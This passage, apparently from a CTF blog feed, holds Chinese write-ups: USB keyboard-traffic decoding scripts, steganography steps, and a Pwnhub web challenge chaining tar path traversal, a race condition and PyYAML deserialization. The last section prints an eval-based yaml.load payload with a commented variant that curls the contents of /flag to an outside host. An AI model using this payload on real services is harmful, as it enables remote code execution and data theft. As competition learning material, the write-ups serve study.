/><p>大小crc都一样，</p><p>发现有一个问题，这里是202个files，但是文件夹里只有201个</p><p><img src="/../imgs/20220619CICSNHDB/image_bfyee4QYo0.png"></p><img src="../imgs/20220619CICSNHDB/image_LEbs_NHCKy.png" style="zoom: 33%;" /><p><img src="/../imgs/20220619CICSNHDB/image_vI-A9ixbsy.png"></p><p><img src="/../imgs/20220619CICSNHDB/image_lgM4sKVtmB.png"></p><p><img src="/../imgs/20220619CICSNHDB/image_MffanHtnNU.png"></p><p>结合提示，用010editor把这部分compression的data提取出来，用Inflate解压，cyberchef我的神。</p><p><img src="/../imgs/20220619CICSNHDB/image-20220624141801022.png" alt="image-20220624141801022"></p><p><img src="/../imgs/20220619CICSNHDB/image-20220624141937846.png" alt="image-20220624141937846"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-CICSN-Misc-Wp</title>
    <link href="https://www.imfengyuan.info/2022/06/15/20220615CICSN/"/>
    <id>https://www.imfengyuan.info/2022/06/15/20220615CICSN/</id>
    <published>2022-06-15T11:19:23.000Z</published>
    <updated>2022-06-15T12:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-CICSN-国赛MiscWp"><a href="#2022-CICSN-国赛MiscWp" class="headerlink" title="2022-CICSN-国赛MiscWp"></a>2022-CICSN-国赛MiscWp</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><p><a href="#ez_usb">ez_usb</a></p></li><li><p><a href="#everlasting_night">everlasting_night</a></p></li></ul><h2 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h2><p>看到HID_DATA，提取键盘数据，发现有两个2.4 和2.8俩个键盘流量 提取发现</p><p>先提取json格式的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -T json -r ez_usb.pcapng &gt; test.json<br></code></pre></td></tr></table></figure><p>分别提取流量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-comment"># Opening JSON file</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.json&#x27;</span>)<br><span class="hljs-comment"># returns JSON object as </span><br><span class="hljs-comment"># a dictionary</span><br>data = json.load(f)<br><span class="hljs-comment"># Iterating through the json</span><br><span class="hljs-comment"># list</span><br><span class="hljs-comment"># Closing file</span><br>f.close()<br>test_8 = []<br>test_10 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-keyword">if</span> data[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;usb&#x27;</span>][<span class="hljs-string">&#x27;usb.src&#x27;</span>] == <span class="hljs-string">&#x27;2.8.1&#x27;</span>:<br>        hid = data[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;usbhid.data&#x27;</span>]<br>        test_8.append(hid)<br>    <span class="hljs-keyword">if</span> data[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;usb&#x27;</span>][<span class="hljs-string">&#x27;usb.src&#x27;</span>] == <span class="hljs-string">&#x27;2.10.1&#x27;</span>:<br>        hid = data[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;usbhid.data&#x27;</span>]<br>        test_10.append(hid)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test_8.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(test_8))<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test_10.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(test_10))<br></code></pre></td></tr></table></figure><p>在用网上轮子提取分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test_8.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br><br></code></pre></td></tr></table></figure><p>发现一部分流量为十六进制的压缩包，另一串可以解开压缩包得到flag</p><p><img src="/../imgs/20220615CICSN/image_zb0ZDZSW3O.png"></p><h2 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h2><p><img src="/../imgs/20220615CICSN/image_iz-BAeoDnl.png"></p><p>白嫖密码，一个lsb隐写提取zip 一个解开zip（当然后面也给了提示zsteg也能看到附加的十六进制的md5，cmd5解不出来，somd5可以。还有一个通道隐写。alpha通道），得到一个坏png头的</p><p><img src="/../imgs/20220615CICSN/image_8glQAxljNK.png"></p><p>之前有一次比赛用过GIMP直接利用IDAT段得到数据</p><p><img src="/../imgs/20220615CICSN/image_OpBxCDuk-s.png"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-PwnhubJune-Misc/Web-Wp</title>
    <link href="https://www.imfengyuan.info/2022/06/12/20220612Pwnhub/"/>
    <id>https://www.imfengyuan.info/2022/06/12/20220612Pwnhub/</id>
    <published>2022-06-12T17:05:28.000Z</published>
    <updated>2022-06-12T17:05:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnhub-六月内部"><a href="#Pwnhub-六月内部" class="headerlink" title="Pwnhub-六月内部"></a>Pwnhub-六月内部</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><p><a href="#web-login-game">Web: login game</a></p><ul><li><ul><li><a href="#%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6">题目附件</a></li></ul></li><li><p><a href="#%E4%B8%80%E5%82%A8%E5%A4%87">一、储备</a></p><ul><li><p><a href="#1-tar%E5%8C%85%E5%87%BD%E6%95%B0%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6">1. tar包函数目录穿越覆盖文件</a></p></li><li><p><a href="#----2yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">2.yaml反序列化</a></p></li></ul></li><li><p><a href="#%E4%BA%8C%E6%80%9D%E8%B7%AF">二、思路</a></p></li><li><p><a href="#%E4%B8%89%E6%B5%8B%E8%AF%95">三、测试</a></p></li></ul></li><li><p><a href="#misc-%E4%BC%8F%E7%BE%B2%E5%85%AB%E5%8D%A6">Misc: 伏羲八卦</a></p><ul><li><p><a href="#%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6-1">题目附件</a></p></li><li><p><a href="#%E4%B8%80%E5%82%A8%E5%A4%87-1">一、储备</a></p></li><li><p><a href="#%E4%BA%8C%E6%80%9D%E8%B7%AF-1">二、思路</a></p></li><li><p><a href="#%E4%B8%89%E6%AD%A5%E9%AA%A4">三、步骤</a></p><ul><li><a href="#1%E6%8F%90%E5%8F%96%E6%AF%8F%E4%B8%AA%E5%B8%A7">1.提取每个帧</a></li><li><a href="#2%E6%8F%90%E5%8F%96">2.提取</a></li><li><a href="#3%E8%A7%A3%E7%A0%81">3.解码</a></li><li><a href="#4final-">4.final </a></li></ul></li></ul></li></ul><h1 id="Web-login-game"><a href="#Web-login-game" class="headerlink" title="Web: login game"></a>Web: login game</h1><h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><p><a href="../file/source_4c27974847bc7d980066af5af89dca02%20(2)_6VxUP4.zip">source_4c27974847bc7d980066af5af89dca02 (2).zip</a></p><h2 id="一、储备"><a href="#一、储备" class="headerlink" title="一、储备"></a>一、储备</h2><h3 id="1-tar包函数目录穿越覆盖文件"><a href="#1-tar包函数目录穿越覆盖文件" class="headerlink" title="1. tar包函数目录穿越覆盖文件"></a>1. tar包函数目录穿越覆盖文件</h3><p><a href="https://www.163.com/dy/article/H05SAB9I05318EB9.html">https://www.163.com/dy/article/H05SAB9I05318EB9.html</a></p><img src="../imgs/20220612Pwnhub/image_qXHUKJhdGX.png" style="zoom:33%;" /><img src="../imgs/20220612Pwnhub/image_KIjO-OcrtZ.png" style="zoom: 33%;" /><h3 id="2-yaml反序列化"><a href="#2-yaml反序列化" class="headerlink" title="2.yaml反序列化"></a>2.yaml反序列化</h3><p>&amp;#x20;      YAML 高版本后弃用了yaml.load(file)这个用法，因为觉得很不安全高版本之后就修改了需要指定Loader，通过默认加载​​器（FullLoader）禁止执行任意函数，该load函数也变得更加安全</p><p>&amp;#x20;  所以从题目来看，题目中的yaml版本应该是低于高版本的的</p><p>​这里有师傅的3个POC，可以用。</p><p>&lt;<a href="https://www.freebuf.com/vuls/256243.html&gt;">https://www.freebuf.com/vuls/256243.html&gt;</a></p><h2 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h2><ul><li><p>目标：将POC写入userConfig.yml 执行到yaml.load()</p></li><li><p>解决问题1：找到适合的POC</p></li><li><p>需解决问题2：绕过重写（wirte），考虑条件竞争绕过</p></li><li><p>需要解决问题3：如何写入userConfig.yml → tar 目录穿越</p></li></ul><img src="../imgs/20220612Pwnhub/image_lBxWdNpAYo.png" style="zoom: 33%;" /><h2 id="三、测试"><a href="#三、测试" class="headerlink" title="三、测试"></a>三、测试</h2><ul><li><p>反序列化测试POC，参照上文POC</p><p>挑个好看一点的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple </span><br><span class="hljs-string">- !!python/object/new:map </span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [ print(&#x27;漏洞存在&#x27;) ] # [ __import__(&#x27;os&#x27;).system(&#x27;curl ip/flag=`cat /flag`) ]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>yaml.load(payload)<br></code></pre></td></tr></table></figure></li><li><p>生成tar目录穿越覆盖</p><ul><li><p><a href="https://github.com/1135/notes/blob/master/web_vul_PathTraversal.md" title="https://github.com/1135/notes/blob/master/web_vul_PathTraversal.md">https://github.com/1135/notes/blob/master/web_vul_PathTraversal.md</a> 